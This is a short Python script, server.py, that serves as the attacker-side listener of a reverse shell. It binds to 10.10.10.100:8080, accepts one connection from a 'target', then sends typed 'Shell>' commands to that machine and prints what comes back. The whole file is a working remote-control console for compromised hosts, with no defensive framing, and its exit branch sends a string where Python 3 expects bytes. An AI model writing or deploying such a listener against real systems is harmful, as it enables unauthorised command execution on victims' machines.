#server.py

import socket  

def connect():
	
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("10.10.10.100", 8080))
	s.listen(1) # For one target use case, we only want one connection (1)
	conn, addr = s.accept()
	print ('[+] Received connection from : ', addr)
	
	while True:
		
		command = input("Shell> ")
		
		if 'exit' in command:
			conn.send('exit')
			conn.close() # Close socket connection
			break
		
		else:
			conn.send(command.encode())    # Send command
			print (conn.recv(1024).decode()) # receive command result / error
					
def main():
	connect()
    
main()
